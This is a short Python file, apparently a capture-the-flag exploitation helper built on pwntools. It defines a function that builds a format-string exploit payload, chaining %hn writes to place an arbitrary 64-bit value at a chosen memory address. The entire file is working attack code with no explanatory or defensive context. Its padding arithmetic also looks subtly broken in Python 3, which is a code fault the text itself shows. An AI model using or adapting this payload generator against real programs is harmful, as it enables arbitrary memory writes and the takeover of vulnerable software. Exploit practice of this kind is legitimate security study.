from pwn import *
from q4nlib.misc import Latin1_decode, Latin1_encode

def fmtpayload(offset,address,value):
    # from @Lewis
    payload = ""
    t = value
    last = 0
    padding=0x60
    for i in range(4):
        payload += "%{}d%{}$hn".format(t % 0x10000 - last + 0x10000, offset+padding/8+i) #t % 0x10000 - last + 0x10000
        last = t % 0x10000
        t = t >> 16
    payload = Latin1_encode(payload).ljust(padding, b"\x00")
    for i in range(4):
        payload += p64(address + i * 2)
    return payload

